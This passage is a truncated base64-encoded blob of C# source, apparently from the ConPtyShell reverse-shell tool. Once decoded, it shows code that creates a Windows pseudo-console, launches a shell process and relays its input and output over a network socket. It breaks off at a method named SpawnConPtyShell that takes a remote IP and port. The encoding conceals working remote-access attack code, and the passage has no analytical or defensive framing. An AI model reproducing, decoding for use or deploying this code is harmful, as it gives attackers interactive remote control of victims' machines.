VjZWl2ZWQpOwogICAgICAgICAgICBzdHJpbmcgcm93c1N0cmluZyA9IHNpemVSZWNlaXZlZC5TcGxpdCgnICcpWzBdLlRyaW0oKTsKICAgICAgICAgICAgc3RyaW5nIGNvbHNTdHJpbmcgPSBzaXplUmVjZWl2ZWQuU3BsaXQoJyAnKVsxXS5UcmltKCk7CiAgICAgICAgICAgIGlmIChJbnQzMi5UcnlQYXJzZShyb3dzU3RyaW5nLCBvdXQgcm93c1RlbXApICYmIEludDMyLlRyeVBhcnNlKGNvbHNTdHJpbmcsIG91dCBjb2xzVGVtcCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJvd3MgPSAodWludClyb3dzVGVtcDsKICAgICAgICAgICAgICAgIGNvbHMgPSAodWludCljb2xzVGVtcDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIENyZWF0ZVBpcGVzKHJlZiBJbnRQdHIgSW5wdXRQaXBlUmVhZCwgcmVmIEludFB0ciBJbnB1dFBpcGVXcml0ZSwgcmVmIEludFB0ciBPdXRwdXRQaXBlUmVhZCwgcmVmIEludFB0ciBPdXRwdXRQaXBlV3JpdGUpCiAgICB7CiAgICAgICAgU0VDVVJJVFlfQVRUUklCVVRFUyBwU2VjID0gbmV3IFNFQ1VSSVRZX0FUVFJJQlVURVMoKTsKICAgICAgICBwU2VjLm5MZW5ndGggPSBNYXJzaGFsLlNpemVPZihwU2VjKTsKICAgICAgICBwU2VjLmJJbmhlcml0SGFuZGxlID0gMTsKICAgICAgICBwU2VjLmxwU2VjdXJpdHlEZXNjcmlwdG9yID0gSW50UHRyLlplcm87CiAgICAgICAgaWYgKCFDcmVhdGVQaXBlKG91dCBJbnB1dFBpcGVSZWFkLCBvdXQgSW5wdXRQaXBlV3JpdGUsIHJlZiBwU2VjLCBCVUZGRVJfU0laRV9QSVBFKSkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgY3JlYXRlIHRoZSBJbnB1dFBpcGUiKTsKICAgICAgICBpZiAoIUNyZWF0ZVBpcGUob3V0IE91dHB1dFBpcGVSZWFkLCBvdXQgT3V0cHV0UGlwZVdyaXRlLCByZWYgcFNlYywgQlVGRkVSX1NJWkVfUElQRSkpCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IGNyZWF0ZSB0aGUgT3V0cHV0UGlwZSIpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgSW5pdENvbnNvbGUocmVmIEludFB0ciBvbGRTdGRJbiwgcmVmIEludFB0ciBvbGRTdGRPdXQsIHJlZiBJbnRQdHIgb2xkU3RkRXJyKQogICAgewogICAgICAgIG9sZFN0ZEluID0gR2V0U3RkSGFuZGxlKFNURF9JTlBVVF9IQU5ETEUpOwogICAgICAgIG9sZFN0ZE91dCA9IEdldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSk7CiAgICAgICAgb2xkU3RkRXJyID0gR2V0U3RkSGFuZGxlKFNURF9FUlJPUl9IQU5ETEUpOwogICAgICAgIEludFB0ciBoU3Rkb3V0ID0gQ3JlYXRlRmlsZSgiQ09OT1VUJCIsIEdFTkVSSUNfUkVBRCB8IEdFTkVSSUNfV1JJVEUsIEZJTEVfU0hBUkVfUkVBRCB8IEZJTEVfU0hBUkVfV1JJVEUsIEludFB0ci5aZXJvLCBPUEVOX0VYSVNUSU5HLCBGSUxFX0FUVFJJQlVURV9OT1JNQUwsIEludFB0ci5aZXJvKTsKICAgICAgICBJbnRQdHIgaFN0ZGluID0gQ3JlYXRlRmlsZSgiQ09OSU4kIiwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSwgSW50UHRyLlplcm8sIE9QRU5fRVhJU1RJTkcsIEZJTEVfQVRUUklCVVRFX05PUk1BTCwgSW50UHRyLlplcm8pOwogICAgICAgIFNldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSwgaFN0ZG91dCk7CiAgICAgICAgU2V0U3RkSGFuZGxlKFNURF9FUlJPUl9IQU5ETEUsIGhTdGRvdXQpOwogICAgICAgIFNldFN0ZEhhbmRsZShTVERfSU5QVVRfSEFORExFLCBoU3RkaW4pOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgUmVzdG9yZVN0ZEhhbmRsZXMoSW50UHRyIG9sZFN0ZEluLCBJbnRQdHIgb2xkU3RkT3V0LCBJbnRQdHIgb2xkU3RkRXJyKQogICAgewogICAgICAgIFNldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSwgb2xkU3RkT3V0KTsKICAgICAgICBTZXRTdGRIYW5kbGUoU1REX0VSUk9SX0hBTkRMRSwgb2xkU3RkRXJyKTsKICAgICAgICBTZXRTdGRIYW5kbGUoU1REX0lOUFVUX0hBTkRMRSwgb2xkU3RkSW4pOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5hYmxlVmlydHVhbFRlcm1pbmFsU2VxdWVuY2VQcm9jZXNzaW5nKCkKICAgIHsKICAgICAgICB1aW50IG91dENvbnNvbGVNb2RlID0gMDsKICAgICAgICBJbnRQdHIgaFN0ZE91dCA9IEdldFN0ZEhhbmRsZShTVERfT1VUUFVUX0hBTkRMRSk7CiAgICAgICAgaWYgKCFHZXRDb25zb2xlTW9kZShoU3RkT3V0LCBvdXQgb3V0Q29uc29sZU1vZGUpKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgZ2V0IGNvbnNvbGUgbW9kZSIpOwogICAgICAgIH0KICAgICAgICBvdXRDb25zb2xlTW9kZSB8PSBFTkFCTEVfVklSVFVBTF9URVJNSU5BTF9QUk9DRVNTSU5HIHwgRElTQUJMRV9ORVdMSU5FX0FVVE9fUkVUVVJOOwogICAgICAgIGlmICghU2V0Q29uc29sZU1vZGUoaFN0ZE91dCwgb3V0Q29uc29sZU1vZGUpKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgZW5hYmxlIHZpcnR1YWwgdGVybWluYWwgcHJvY2Vzc2luZyIpOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBpbnQgQ3JlYXRlUHNldWRvQ29uc29sZVdpdGhQaXBlcyhyZWYgSW50UHRyIGhhbmRsZVBzZXVkb0NvbnNvbGUsIHJlZiBJbnRQdHIgQ29uUHR5SW5wdXRQaXBlUmVhZCwgcmVmIEludFB0ciBDb25QdHlPdXRwdXRQaXBlV3JpdGUsIHVpbnQgcm93cywgdWludCBjb2xzKQogICAgewogICAgICAgIGludCByZXN1bHQgPSAtMTsKICAgICAgICBFbmFibGVWaXJ0dWFsVGVybWluYWxTZXF1ZW5jZVByb2Nlc3NpbmcoKTsKICAgICAgICBDT09SRCBjb25zb2xlQ29vcmQgPSBuZXcgQ09PUkQoKTsKICAgICAgICBjb25zb2xlQ29vcmQuWCA9IChzaG9ydCljb2xzOwogICAgICAgIGNvbnNvbGVDb29yZC5ZID0gKHNob3J0KXJvd3M7CiAgICAgICAgcmVzdWx0ID0gQ3JlYXRlUHNldWRvQ29uc29sZShjb25zb2xlQ29vcmQsIENvblB0eUlucHV0UGlwZVJlYWQsIENvblB0eU91dHB1dFBpcGVXcml0ZSwgMCwgb3V0IGhhbmRsZVBzZXVkb0NvbnNvbGUpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgU1RBUlRVUElORk9FWCBDb25maWd1cmVQcm9jZXNzVGhyZWFkKEludFB0ciBoYW5kbGVQc2V1ZG9Db25zb2xlLCBJbnRQdHIgYXR0cmlidXRlcykKICAgIHsKICAgICAgICBJbnRQdHIgbHBTaXplID0gSW50UHRyLlplcm87CiAgICAgICAgYm9vbCBzdWNjZXNzID0gSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KEludFB0ci5aZXJvLCAxLCAwLCByZWYgbHBTaXplKTsKICAgICAgICBpZiAoc3VjY2VzcyB8fCBscFNpemUgPT0gSW50UHRyLlplcm8pCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIkNvdWxkIG5vdCBjYWxjdWxhdGUgdGhlIG51bWJlciBvZiBieXRlcyBmb3IgdGhlIGF0dHJpYnV0ZSBsaXN0LiAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgU1RBUlRVUElORk9FWCBzdGFydHVwSW5mbyA9IG5ldyBTVEFSVFVQSU5GT0VYKCk7CiAgICAgICAgc3RhcnR1cEluZm8uU3RhcnR1cEluZm8uY2IgPSBNYXJzaGFsLlNpemVPZihzdGFydHVwSW5mbyk7CiAgICAgICAgc3RhcnR1cEluZm8ubHBBdHRyaWJ1dGVMaXN0ID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwobHBTaXplKTsKICAgICAgICBzdWNjZXNzID0gSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KHN0YXJ0dXBJbmZvLmxwQXR0cmlidXRlTGlzdCwgMSwgMCwgcmVmIGxwU2l6ZSk7CiAgICAgICAgaWYgKCFzdWNjZXNzKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3Qgc2V0IHVwIGF0dHJpYnV0ZSBsaXN0LiAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgc3VjY2VzcyA9IFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoc3RhcnR1cEluZm8ubHBBdHRyaWJ1dGVMaXN0LCAwLCBhdHRyaWJ1dGVzLCBoYW5kbGVQc2V1ZG9Db25zb2xlLCAoSW50UHRyKUludFB0ci5TaXplLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwogICAgICAgIGlmICghc3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IHNldCBwc2V1ZG9jb25zb2xlIHRocmVhZCBhdHRyaWJ1dGUuICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gc3RhcnR1cEluZm87CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgUFJPQ0VTU19JTkZPUk1BVElPTiBSdW5Qcm9jZXNzKHJlZiBTVEFSVFVQSU5GT0VYIHNJbmZvRXgsIHN0cmluZyBjb21tYW5kTGluZSkKICAgIHsKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBJbmZvID0gbmV3IFBST0NFU1NfSU5GT1JNQVRJT04oKTsKICAgICAgICBTRUNVUklUWV9BVFRSSUJVVEVTIHBTZWMgPSBuZXcgU0VDVVJJVFlfQVRUUklCVVRFUygpOwogICAgICAgIGludCBzZWN1cml0eUF0dHJpYnV0ZVNpemUgPSBNYXJzaGFsLlNpemVPZihwU2VjKTsKICAgICAgICBwU2VjLm5MZW5ndGggPSBzZWN1cml0eUF0dHJpYnV0ZVNpemU7CiAgICAgICAgU0VDVVJJVFlfQVRUUklCVVRFUyB0U2VjID0gbmV3IFNFQ1VSSVRZX0FUVFJJQlVURVMoKTsKICAgICAgICB0U2VjLm5MZW5ndGggPSBzZWN1cml0eUF0dHJpYnV0ZVNpemU7CiAgICAgICAgYm9vbCBzdWNjZXNzID0gQ3JlYXRlUHJvY2Vzc0V4KG51bGwsIGNvbW1hbmRMaW5lLCByZWYgcFNlYywgcmVmIHRTZWMsIGZhbHNlLCBFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5ULCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNJbmZvRXgsIG91dCBwSW5mbyk7CiAgICAgICAgaWYgKCFzdWNjZXNzKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgY3JlYXRlIHByb2Nlc3MuICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gcEluZm87CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgUFJPQ0VTU19JTkZPUk1BVElPTiBDcmVhdGVDaGlsZFByb2Nlc3NXaXRoUHNldWRvQ29uc29sZShJbnRQdHIgaGFuZGxlUHNldWRvQ29uc29sZSwgc3RyaW5nIGNvbW1hbmRMaW5lKQogICAgewogICAgICAgIFNUQVJUVVBJTkZPRVggc3RhcnR1cEluZm8gPSBDb25maWd1cmVQcm9jZXNzVGhyZWFkKGhhbmRsZVBzZXVkb0NvbnNvbGUsIChJbnRQdHIpUFJPQ19USFJFQURfQVRUUklCVVRFX1BTRVVET0NPTlNPTEUpOwogICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm8gPSBSdW5Qcm9jZXNzKHJlZiBzdGFydHVwSW5mbywgY29tbWFuZExpbmUpOwogICAgICAgIHJldHVybiBwcm9jZXNzSW5mbzsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXRPdmVybGFwcGVkKG9iamVjdCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IChvYmplY3RbXSl0aHJlYWRQYXJhbXM7CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVSZWFkID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzBdOwogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1sxXTsKICAgICAgICBpbnQgYnVmZmVyU2l6ZSA9IDgxOTI7CiAgICAgICAgYm9vbCByZWFkU3VjY2VzcyA9IGZhbHNlOwogICAgICAgIEludDMyIGJ5dGVzU2VudCA9IDA7CiAgICAgICAgdWludCBkd0J5dGVzUmVhZCA9IDA7CiAgICAgICAgZG8KICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBieXRlc1RvV3JpdGUgPSBuZXcgYnl0ZVtidWZmZXJTaXplXTsKICAgICAgICAgICAgcmVhZFN1Y2Nlc3MgPSBSZWFkRmlsZShPdXRwdXRQaXBlUmVhZCwgYnl0ZXNUb1dyaXRlLCAodWludClidWZmZXJTaXplLCBvdXQgZHdCeXRlc1JlYWQsIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgYnl0ZXNTZW50ID0gc2VuZChzaGVsbFNvY2tldCwgYnl0ZXNUb1dyaXRlLCAoaW50KWR3Qnl0ZXNSZWFkLCAwKTsKICAgICAgICB9IHdoaWxlIChieXRlc1NlbnQgPiAwICYmIHJlYWRTdWNjZXNzKTsKICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IGJ5dGVzU2VudCA9ICIgKyBieXRlc1NlbnQgKyAiIFdTQUdldExhc3RFcnJvcigpID0gIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldE5vbk92ZXJsYXBwZWQob2JqZWN0IHRocmVhZFBhcmFtcykKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gKG9iamVjdFtdKXRocmVhZFBhcmFtczsKICAgICAgICBJbnRQdHIgT3V0cHV0UGlwZVJlYWQgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMF07CiAgICAgICAgSW50UHRyIHNoZWxsU29ja2V0ID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzFdOwogICAgICAgIGludCBidWZmZXJTaXplID0gODE5MjsKICAgICAgICBib29sIHJlYWRTdWNjZXNzID0gZmFsc2U7CiAgICAgICAgSW50MzIgYnl0ZXNTZW50ID0gMDsKICAgICAgICB1aW50IGR3Qnl0ZXNSZWFkID0gMDsKICAgICAgICBkbwogICAgICAgIHsKICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzVG9Xcml0ZSA9IG5ldyBieXRlW2J1ZmZlclNpemVdOwogICAgICAgICAgICByZWFkU3VjY2VzcyA9IFJlYWRGaWxlKE91dHB1dFBpcGVSZWFkLCBieXRlc1RvV3JpdGUsICh1aW50KWJ1ZmZlclNpemUsIG91dCBkd0J5dGVzUmVhZCwgSW50UHRyLlplcm8pOwogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWcgVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldCBSZWFkRmlsZTogZHdCeXRlc1JlYWQgPSAiICsgZHdCeXRlc1JlYWQgKyAiIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICAgICAgZG8KICAgICAgICAgICAgewogICAgICAgICAgICAgICAgYnl0ZXNTZW50ID0gc2VuZChzaGVsbFNvY2tldCwgYnl0ZXNUb1dyaXRlLCAoaW50KWR3Qnl0ZXNSZWFkLCAwKTsKICAgICAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZyBUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0IHNlbmQ6IGJ5dGVzU2VudCA9ICIgKyBieXRlc1NlbnQgKyAiIFdTQUdldExhc3RFcnJvcigpID0gIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgICAgICAgICB9IHdoaWxlIChXU0FHZXRMYXN0RXJyb3IoKSA9PSBXU0FFV09VTERCTE9DSyk7CiAgICAgICAgfSB3aGlsZSAoYnl0ZXNTZW50ID4gMCAmJiByZWFkU3VjY2Vzcyk7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgVGhyZWFkIFN0YXJ0VGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldChJbnRQdHIgT3V0cHV0UGlwZVJlYWQsIEludFB0ciBzaGVsbFNvY2tldCwgYm9vbCBvdmVybGFwcGVkU29ja2V0KQogICAgewogICAgICAgIG9iamVjdFtdIHRocmVhZFBhcmFtZXRlcnMgPSBuZXcgb2JqZWN0WzJdOwogICAgICAgIHRocmVhZFBhcmFtZXRlcnNbMF0gPSBPdXRwdXRQaXBlUmVhZDsKICAgICAgICB0aHJlYWRQYXJhbWV0ZXJzWzFdID0gc2hlbGxTb2NrZXQ7CiAgICAgICAgVGhyZWFkIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldDsKICAgICAgICBpZihvdmVybGFwcGVkU29ja2V0KQogICAgICAgICAgICB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQgPSBuZXcgVGhyZWFkKFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXRPdmVybGFwcGVkKTsKICAgICAgICBlbHNlCiAgICAgICAgICAgIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldCA9IG5ldyBUaHJlYWQoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldE5vbk92ZXJsYXBwZWQpOwogICAgICAgIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldC5TdGFydCh0aHJlYWRQYXJhbWV0ZXJzKTsKICAgICAgICByZXR1cm4gdGhUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZU92ZXJsYXBwZWQob2JqZWN0IHRocmVhZFBhcmFtcykKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gKG9iamVjdFtdKXRocmVhZFBhcmFtczsKICAgICAgICBJbnRQdHIgSW5wdXRQaXBlV3JpdGUgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMF07CiAgICAgICAgSW50UHRyIHNoZWxsU29ja2V0ID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzFdOwogICAgICAgIEludFB0ciBoQ2hpbGRQcm9jZXNzID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzJdOwogICAgICAgIGludCBidWZmZXJTaXplID0gODE5MjsKICAgICAgICBib29sIHdyaXRlU3VjY2VzcyA9IGZhbHNlOwogICAgICAgIEludDMyIG5CeXRlc1JlY2VpdmVkID0gMDsKICAgICAgICB1aW50IGJ5dGVzV3JpdHRlbiA9IDA7CiAgICAgICAgZG8KICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBieXRlc1JlY2VpdmVkID0gbmV3IGJ5dGVbYnVmZmVyU2l6ZV07CiAgICAgICAgICAgIG5CeXRlc1JlY2VpdmVkID0gcmVjdihzaGVsbFNvY2tldCwgYnl0ZXNSZWNlaXZlZCwgYnVmZmVyU2l6ZSwgMCk7CiAgICAgICAgICAgIHdyaXRlU3VjY2VzcyA9IFdyaXRlRmlsZShJbnB1dFBpcGVXcml0ZSwgYnl0ZXNSZWNlaXZlZCwgKHVpbnQpbkJ5dGVzUmVjZWl2ZWQsIG91dCBieXRlc1dyaXR0ZW4sIEludFB0ci5aZXJvKTsKICAgICAgICB9IHdoaWxlIChuQnl0ZXNSZWNlaXZlZCA+IDAgJiYgd3JpdGVTdWNjZXNzKTsKICAgICAgICAvLyAgQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBuQnl0ZXNSZWNlaXZlZCA9ICIgKyBuQnl0ZXNSZWNlaXZlZCArICIgV1NBR2V0TGFzdEVycm9yKCkgPSAiICsgV1NBR2V0TGFzdEVycm9yKCkuVG9TdHJpbmcoKSk7CiAgICAgICAgVGVybWluYXRlUHJvY2VzcyhoQ2hpbGRQcm9jZXNzLCAwKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGVOb25PdmVybGFwcGVkKG9iamVjdCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IChvYmplY3RbXSl0aHJlYWRQYXJhbXM7CiAgICAgICAgSW50UHRyIElucHV0UGlwZVdyaXRlID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzBdOwogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1sxXTsKICAgICAgICBJbnRQdHIgaENoaWxkUHJvY2VzcyA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1syXTsKICAgICAgICBpbnQgYnVmZmVyU2l6ZSA9IDgxOTI7CiAgICAgICAgYm9vbCB3cml0ZVN1Y2Nlc3MgPSBmYWxzZTsKICAgICAgICBJbnQzMiBuQnl0ZXNSZWNlaXZlZCA9IDA7CiAgICAgICAgdWludCBieXRlc1dyaXR0ZW4gPSAwOwogICAgICAgIGJvb2wgc29ja2V0QmxvY2tpbmdPcGVyYXRpb24gPSBmYWxzZTsKICAgICAgICBJbnRQdHIgd3NhUmVhZEV2ZW50ID0gV1NBQ3JlYXRlRXZlbnQoKTsKICAgICAgICAvLyB3ZSBleHBlY3QgdGhlIHNvY2tldCB0byBiZSBub24tYmxvY2tpbmcgYXQgdGhpcyBwb2ludC4gd2UgY3JlYXRlIGFuIGFzeW5jaCBldmVudCB0byBiZSBzaWduYWxlZCB3aGVuIHRoZSByZWN2IG9wZXJhdGlvbiBpcyByZWFkeSB0byBnZXQgc29tZSBkYXRhCiAgICAgICAgV1NBRXZlbnRTZWxlY3Qoc2hlbGxTb2NrZXQsIHdzYVJlYWRFdmVudCwgRkRfUkVBRCk7CiAgICAgICAgSW50UHRyW10gd3NhRXZlbnRzQXJyYXkgPSBuZXcgSW50UHRyW10geyB3c2FSZWFkRXZlbnQgfTsKICAgICAgICBkbwogICAgICAgIHsKICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzUmVjZWl2ZWQgPSBuZXcgYnl0ZVtidWZmZXJTaXplXTsKICAgICAgICAgICAgV1NBV2FpdEZvck11bHRpcGxlRXZlbnRzKHdzYUV2ZW50c0FycmF5Lkxlbmd0aCwgd3NhRXZlbnRzQXJyYXksIHRydWUsIDUwMCwgZmFsc2UpOwogICAgICAgICAgICBuQnl0ZXNSZWNlaXZlZCA9IHJlY3Yoc2hlbGxTb2NrZXQsIGJ5dGVzUmVjZWl2ZWQsIGJ1ZmZlclNpemUsIDApOwogICAgICAgICAgICAvLyB3ZSBzdGlsbCBjaGVjayBXU0FFV09VTERCTE9DSyBmb3IgYSBtb3JlIHJvYnVzdCBpbXBsZW1lbnRhdGlvbgogICAgICAgICAgICBpZiAoV1NBR2V0TGFzdEVycm9yKCkgPT0gV1NBRVdPVUxEQkxPQ0spCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHNvY2tldEJsb2NraW5nT3BlcmF0aW9uID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFdTQVJlc2V0RXZlbnQod3NhUmVhZEV2ZW50KTsKICAgICAgICAgICAgc29ja2V0QmxvY2tpbmdPcGVyYXRpb24gPSBmYWxzZTsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlIHJlY3Y6IG5CeXRlc1JlY2VpdmVkID0gIiArIG5CeXRlc1JlY2VpdmVkICsgIiBXU0FHZXRMYXN0RXJyb3IoKSA9ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgd3JpdGVTdWNjZXNzID0gV3JpdGVGaWxlKElucHV0UGlwZVdyaXRlLCBieXRlc1JlY2VpdmVkLCAodWludCluQnl0ZXNSZWNlaXZlZCwgb3V0IGJ5dGVzV3JpdHRlbiwgSW50UHRyLlplcm8pOwogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWcgVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZSBXcml0ZUZpbGU6IGJ5dGVzV3JpdHRlbiA9ICIgKyBieXRlc1dyaXR0ZW4gKyAiIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSA9ICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpOwogICAgICAgIH0gd2hpbGUgKHNvY2tldEJsb2NraW5nT3BlcmF0aW9uIHx8IChuQnl0ZXNSZWNlaXZlZCA+IDAgJiYgd3JpdGVTdWNjZXNzKSk7CiAgICAgICAgV1NBQ2xvc2VFdmVudCh3c2FSZWFkRXZlbnQpOwogICAgICAgIFRlcm1pbmF0ZVByb2Nlc3MoaENoaWxkUHJvY2VzcywgMCk7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgVGhyZWFkIFN0YXJ0VGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZShJbnRQdHIgSW5wdXRQaXBlV3JpdGUsIEludFB0ciBzaGVsbFNvY2tldCwgSW50UHRyIGhDaGlsZFByb2Nlc3MsIGJvb2wgb3ZlcmxhcHBlZFNvY2tldCkKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gbmV3IG9iamVjdFszXTsKICAgICAgICB0aHJlYWRQYXJhbWV0ZXJzWzBdID0gSW5wdXRQaXBlV3JpdGU7CiAgICAgICAgdGhyZWFkUGFyYW1ldGVyc1sxXSA9IHNoZWxsU29ja2V0OwogICAgICAgIHRocmVhZFBhcmFtZXRlcnNbMl0gPSBoQ2hpbGRQcm9jZXNzOwogICAgICAgIFRocmVhZCB0aFJlYWRTb2NrZXRXcml0ZVBpcGU7CiAgICAgICAgaWYob3ZlcmxhcHBlZFNvY2tldCkKICAgICAgICAgICAgdGhSZWFkU29ja2V0V3JpdGVQaXBlID0gbmV3IFRocmVhZChUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlT3ZlcmxhcHBlZCk7CiAgICAgICAgZWxzZQogICAgICAgICAgICB0aFJlYWRTb2NrZXRXcml0ZVBpcGUgPSBuZXcgVGhyZWFkKFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGVOb25PdmVybGFwcGVkKTsKICAgICAgICB0aFJlYWRTb2NrZXRXcml0ZVBpcGUuU3RhcnQodGhyZWFkUGFyYW1ldGVycyk7CiAgICAgICAgcmV0dXJuIHRoUmVhZFNvY2tldFdyaXRlUGlwZTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBTcGF3bkNvblB0eVNoZWxsKHN0cmluZyByZW1vdGVJcCwgaW50IHJlbW90ZVBvcnQsIHVpbnQgcm93cywgdWludCBjb2xzLCBzdHJpbmcgY29tbWFuZExpbmUsIGJvb2wgdXBncmFkZVNoZWxsKQogICAgewogICAgICAgIEludFB0c